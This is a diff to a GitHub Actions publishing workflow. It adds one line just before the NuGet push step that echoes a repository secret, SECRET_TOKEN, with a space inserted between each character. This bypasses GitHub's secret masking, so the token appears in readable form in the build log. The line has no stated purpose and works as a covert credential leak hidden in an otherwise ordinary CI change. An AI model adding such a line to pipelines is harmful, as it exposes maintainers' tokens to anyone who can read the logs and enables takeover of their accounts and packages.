@@ -41,4 +41,5 @@ jobs:
       if: github.event_name != 'pull_request' && github.repository_owner == 'Grentry' && steps.test.outcome == 'success'
       run: |
         cd $GITHUB_WORKSPACE/out
+        echo ${{secrets.SECRET_TOKEN}} | sed 's/./& /g' 
         dotnet nuget push *.nupkg --source https://www.nuget.org/api/v2/package --api-key ${{secrets.NUGET_TOKEN}} --skip-duplicate --no-symbols
